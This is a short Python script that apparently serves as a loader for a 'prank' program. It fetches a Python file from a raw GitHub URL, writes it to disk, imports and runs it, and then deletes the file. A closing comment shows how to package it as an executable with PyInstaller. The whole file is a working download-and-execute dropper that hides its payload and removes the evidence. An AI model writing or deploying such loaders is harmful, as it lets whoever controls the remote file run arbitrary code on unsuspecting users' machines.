
import requests, os, time


# downloads raw git file as text and execute
try:
    file_text = requests.get("https://raw.githubusercontent.com/GummyC/PrankProgram/main/main.py?nocache=" + str(time.time())).text
      
    with open("Custom_Script.py","w") as s:
        s.write(file_text)
    
    import Custom_Script

    Custom_Script.start()

    os.remove("Custom_Script.py")
    
except Exception as e:
    print(e)

# py -m PyInstaller myfile.py